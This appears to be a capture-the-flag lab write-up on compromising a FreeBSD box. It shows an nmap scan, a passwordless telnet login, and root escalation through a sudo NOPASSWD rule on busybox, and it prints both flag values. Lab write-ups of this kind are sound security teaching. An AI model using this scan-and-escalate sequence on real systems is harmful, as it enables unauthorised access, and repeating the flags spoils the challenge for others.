# User flag

~~~
$ nmap -sC -sV -A 10.10.130.12
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-30 12:19 CEST
Nmap scan report for 10.10.130.12
Host is up (0.073s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
23/tcp open  telnet  BSD-derived telnetd
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.79 seconds
~~~

~~~
$ telnet 10.10.130.12
Trying 10.10.130.12...
Connected to 10.10.130.12.
Escape character is '^]'.
login: pilot
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
If other operating systems have damaged your Master Boot Record, you can
reinstall it with boot0cfg(8). See
"man boot0cfg" for details.
[pilot@freebsd ~]$ cat /home/pilot/user.txt 
THM{r3m0v3_b3f0r3_fl16h7}
~~~

# Root flag

~~~
[pilot@freebsd ~]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd ~]$ sudo busybox sh
# cat /root/root.txt
THM{h16hw4y_70_7h3_d4n63r_z0n3}
# 
~~~